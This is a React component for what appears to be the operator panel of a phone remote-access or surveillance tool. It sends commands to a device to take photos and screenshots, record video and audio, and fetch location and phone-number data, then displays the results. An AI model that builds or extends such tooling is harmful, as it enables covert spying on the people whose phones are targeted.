import { useState, useEffect, useCallback, useRef } from 'react';
import { Send, CheckCircle, AlertTriangle, Copy, Loader } from 'lucide-react';
import { Modal } from '../ui/Modal';
import { sendCommand } from '../../services/api';
import { onSocketEvent } from '../../services/socket';
import type { ComponentType } from 'react';
import type { ProgressStage } from './CommandProgressToast';

interface Props {
  open: boolean;
  onClose: () => void;
  token: string;
  command: string;
  label: string;
  icon: ComponentType<{ size?: number; className?: string }>;
}

function extractUrl(text: string): string | null {
  const m = text.match(/https?:\/\/[^\s✅\]]+/);
  return m ? m[0] : null;
}

function isImageCmd(cmd: string) {
  return cmd === 'take_screenshot' || cmd === 'take_photo_front' || cmd === 'take_photo_back';
}
function isVideoCmd(cmd: string) {
  return cmd === 'record_video_front' || cmd === 'record_video_back';
}
function isAudioCmd(cmd: string) {
  return cmd === 'record_audio';
}

function ProgressBadge({ stage }: { stage: ProgressStage }) {
  if (stage === 'idle') return null;
  const isError = stage === 'error';
  const isDone = stage === 'success' || stage === 'error';
  return (
    <span className={`absolute -top-1.5 -left-1.5 z-10 w-6 h-6 rounded-full flex items-center justify-center shadow-lg border-2 border-white dark:border-surface-900 ${
      isError ? 'bg-rose-500' : isDone ? 'bg-emerald-500' : 'bg-primary-500'
    }`}>
      {!isDone && <Loader size={12} className="text-white animate-spin" />}
      {stage === 'success' && <CheckCircle size={12} className="text-white" />}
      {stage === 'error' && <AlertTriangle size={12} className="text-white" />}
    </span>
  );
}

const STAGE_LABELS: Partial<Record<ProgressStage, string>> = {
  connecting: 'جاري الاتصال بالسيرفر...',
  sending: 'جاري إرسال الأمر...',
  executing: 'جاري تنفيذ الأمر...',
  uploading: 'جاري رفع الملف...',
  receiving: 'جاري استلام الملف...',
};

function StageLabel({ stage }: { stage: ProgressStage }) {
  if (stage === 'idle' || stage === 'success' || stage === 'error') return null;
  return (
    <div className="absolute inset-x-0 -bottom-6 flex justify-center z-10 pointer-events-none">
      <span className="text-[10px] font-bold px-2 py-0.5 rounded-full whitespace-nowrap bg-primary-500 text-white shadow-md">
        {STAGE_LABELS[stage]}
      </span>
    </div>
  );
}

export function DataCommandModal({ open, onClose, token, command, label }: Props) {
  const [reply, setReply] = useState<{ message?: string; response_data?: string; status?: string } | null>(null);
  const [stage, setStage] = useState<ProgressStage>('idle');
  const stageRef = useRef<ProgressStage>('idle');
  const timeoutsRef = useRef<ReturnType<typeof setTimeout>[]>([]);

  useEffect(() => {
    if (!open) return;
    setReply(null);
    setStage('idle');
    stageRef.current = 'idle';
    timeoutsRef.current.forEach(clearTimeout);
    timeoutsRef.current = [];

    const unsubReply = onSocketEvent('command:reply', (data: unknown) => {
      const d = data as { device_token?: string; message?: string; response_data?: string; status?: string };
      if (d.device_token === token) {
        timeoutsRef.current.forEach(clearTimeout);
        timeoutsRef.current = [];
        setStage('receiving');
        stageRef.current = 'receiving';
        setTimeout(() => {
          setReply(d);
          const s = d.status === 'error' ? 'error' : 'success';
          setStage(s);
          stageRef.current = s;
        }, 800);
      }
    });

    const unsubExec = onSocketEvent('command:executing', (data: unknown) => {
      const d = data as { device_token?: string };
      if (d.device_token === token && stageRef.current === 'sending') {
        setStage('executing');
        stageRef.current = 'executing';
      }
    });

    const unsubStatus = onSocketEvent('command:status', (data: unknown) => {
      const d = data as { device_token?: string; status?: string };
      if (d.device_token === token) {
        if (d.status === 'executing') {
          setStage('executing');
          stageRef.current = 'executing';
        } else if (d.status === 'uploading') {
          setStage('uploading');
          stageRef.current = 'uploading';
        } else if (d.status === 'uploaded') {
          setStage('receiving');
          stageRef.current = 'receiving';
        }
      }
    });

    return () => {
      unsubReply();
      unsubExec();
      unsubStatus();
      timeoutsRef.current.forEach(clearTimeout);
    };
  }, [open, token]);

  const handleSend = useCallback(async () => {
    setReply(null);
    setStage('connecting');
    stageRef.current = 'connecting';
    timeoutsRef.current.forEach(clearTimeout);
    timeoutsRef.current = [];

    timeoutsRef.current.push(setTimeout(() => {
      if (stageRef.current === 'connecting') {
        setStage('sending');
        stageRef.current = 'sending';
      }
    }, 500));

    try {
      await sendCommand(token, command);
    } catch {
      setStage('error');
      stageRef.current = 'error';
    }
  }, [token, command]);

  const renderData = () => {
    if (!reply) return null;
    const raw = reply.response_data || reply.message || '';
    const isError = reply.status === 'error';
    const url = extractUrl(raw);

    if (isError) {
      return (
        <div className="p-4 bg-rose-50 dark:bg-rose-500/10 border border-rose-200 dark:border-rose-500/20 rounded-xl">
          <div className="flex items-start gap-3">
            <AlertTriangle size={18} className="text-rose-500 mt-0.5 shrink-0" />
            <p className="text-sm text-rose-700 dark:text-rose-300 break-all">{raw}</p>
          </div>
        </div>
      );
    }

    if (isImageCmd(command)) {
      if (url) {
        return (
          <div className="space-y-3">
            <div className="rounded-xl overflow-hidden border border-surface-200 dark:border-surface-700">
              <img src={url} alt="" className="w-full" />
            </div>
            <div className="flex gap-2">
              <a href={url} target="_blank" rel="noopener noreferrer" className="flex-1 text-center text-xs text-primary-500 hover:underline py-1">فتح في تبويب جديد</a>
              <button onClick={() => navigator.clipboard.writeText(url)} className="flex items-center gap-1 text-xs text-surface-500 hover:text-primary-500"><Copy size={12} /> نسخ الرابط</button>
            </div>
          </div>
        );
      }
      return <p className="text-sm text-surface-500 text-center py-4">تم التنفيذ لكن لم يتم العثور على رابط الملف</p>;
    }

    if (isVideoCmd(command)) {
      if (url) {
        return (
          <div className="rounded-xl overflow-hidden border border-surface-200 dark:border-surface-700">
            <video src={url} controls className="w-full" />
          </div>
        );
      }
      return <p className="text-sm text-surface-500 text-center py-4">تم التنفيذ لكن لم يتم العثور على رابط الملف</p>;
    }

    if (isAudioCmd(command)) {
      if (url) {
        return (
          <div className="p-4 bg-surface-50 dark:bg-surface-800 rounded-xl">
            <audio src={url} controls className="w-full" />
          </div>
        );
      }
      return <p className="text-sm text-surface-500 text-center py-4">تم التنفيذ لكن لم يتم العثور على رابط الملف</p>;
    }

    if (command === 'get_location') {
      try {
        const loc = JSON.parse(raw);
        const lat = loc.latitude || loc.lat;
        const lng = loc.longitude || loc.lng || loc.lon;
        return (
          <div className="space-y-3">
            <div className="p-4 bg-surface-50 dark:bg-surface-800 rounded-xl space-y-2">
              <div className="flex justify-between"><span className="text-xs text-surface-500">خط العرض</span><span className="text-sm font-mono text-surface-900 dark:text-white">{lat}</span></div>
              <div className="flex justify-between"><span className="text-xs text-surface-500">خط الطول</span><span className="text-sm font-mono text-surface-900 dark:text-white">{lng}</span></div>
              {loc.address && <div className="flex justify-between"><span className="text-xs text-surface-500">العنوان</span><span className="text-sm text-surface-900 dark:text-white">{loc.address}</span></div>}
            </div>
            {lat && lng && (
              <a href={`https://www.google.com/maps?q=${lat},${lng}`} target="_blank" rel="noopener noreferrer" className="block text-center text-xs text-primary-500 hover:underline">فتح على الخريطة</a>
            )}
          </div>
        );
      } catch {
        return <pre className="text-xs font-mono bg-surface-50 dark:bg-surface-800 p-3 rounded-xl whitespace-pre-wrap text-right">{raw}</pre>;
      }
    }

    if (command === 'get_number') {
      try {
        const info = JSON.parse(raw);
        return (
          <div className="space-y-2">
            {Object.entries(info).map(([key, val]) => (
              <div key={key} className="flex items-center justify-between p-3 bg-surface-50 dark:bg-surface-800 rounded-xl">
                <span className="text-xs text-surface-500">{key}</span>
                <span className="text-sm font-mono text-surface-900 dark:text-white">{String(val)}</span>
              </div>
            ))}
          </div>
        );
      } catch {
        return <pre className="text-xs font-mono bg-surface-50 dark:bg-surface-800 p-3 rounded-xl whitespace-pre-wrap text-right">{raw}</pre>;
      }
    }

    if (command === 'get_size_photo' || command === 'get_size_video') {
      try {
        const info = JSON.parse(raw);
        return (
          <div className="p-4 bg-surface-50 dark:bg-surface-800 rounded-xl space-y-2">
            {Object.entries(info).map(([key, val]) => (
              <div key={key} className="flex justify-between">
                <span className="text-xs text-surface-500">{key}</span>
                <span className="text-sm text-surface-900 dark:text-white">{String(val)}</span>
              </div>
            ))}
          </div>
        );
      } catch {
        return <p className="text-sm text-surface-700 dark:text-surface-300 text-center py-2">{raw}</p>;
      }
    }

    try {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) {
        return (
          <div className="space-y-1 max-h-64 overflow-y-auto">
            {parsed.map((item, i) => (
              <div key={i} className="p-2.5 bg-surface-50 dark:bg-surface-800 rounded-lg text-xs font-mono text-surface-700 dark:text-surface-300 whitespace-pre-wrap break-all">
                {typeof item === 'object' ? JSON.stringify(item, null, 1) : String(item)}
              </div>
            ))}
          </div>
        );
      }
      return <pre className="text-xs font-mono bg-surface-50 dark:bg-surface-800 p-3 rounded-xl whitespace-pre-wrap text-right max-h-64 overflow-y-auto">{JSON.stringify(parsed, null, 2)}</pre>;
    } catch {
      return <pre className="text-xs font-mono bg-surface-50 dark:bg-surface-800 p-3 rounded-xl whitespace-pre-wrap text-right max-h-64 overflow-y-auto">{raw}</pre>;
    }
  };

  const statusLabel = reply?.status === 'error' ? 'خطأ في التنفيذ' : reply ? 'تم استلام البيانات' : '';
  const isBusy = stage === 'connecting' || stage === 'sending' || stage === 'executing' || stage === 'receiving';

  const BUTTON_LABELS: Partial<Record<ProgressStage, string>> = {
    connecting: 'جاري الاتصال بالسيرفر...',
    sending: 'جاري إرسال الأمر...',
    executing: 'جاري تنفيذ الأمر...',
    receiving: 'جاري استلام الملف...',
    success: 'تم بنجاح ✓',
    error: 'فشل التنفيذ ✗',
  };

  return (
    <Modal open={open} onClose={onClose} title={label}>
      <div className="space-y-4">
        <div className="relative flex justify-center">
          <ProgressBadge stage={stage} />
          <StageLabel stage={stage} />
          <button
            onClick={handleSend}
            disabled={isBusy}
            className="relative w-full flex items-center justify-center gap-2 py-3 rounded-xl bg-gradient-to-r from-primary-500 to-primary-600 text-white font-medium text-sm shadow-lg shadow-primary-500/25 hover:shadow-xl transition-all disabled:opacity-60"
          >
            {isBusy ? <Loader size={18} className="animate-spin" /> : stage === 'success' ? <CheckCircle size={18} /> : stage === 'error' ? <AlertTriangle size={18} /> : <Send size={18} />}
            {BUTTON_LABELS[stage] || `إرسال أمر ${label}`}
          </button>
        </div>

        {reply && (
          <div className="space-y-2">
            <div className={`flex items-center gap-2 ${reply.status === 'error' ? 'text-rose-600 dark:text-rose-400' : 'text-emerald-600 dark:text-emerald-400'}`}>
              {reply.status === 'error' ? <AlertTriangle size={16} /> : <CheckCircle size={16} />}
              <span className="text-xs font-medium">{statusLabel}</span>
            </div>
            {renderData()}
          </div>
        )}

        {!reply && stage === 'idle' && (
          <p className="text-center text-sm text-surface-400 py-6">
            اضغط الزر أعلاه لإرسال الأمر وعرض النتيجة هنا
          </p>
        )}
      </div>
    </Modal>
  );
}
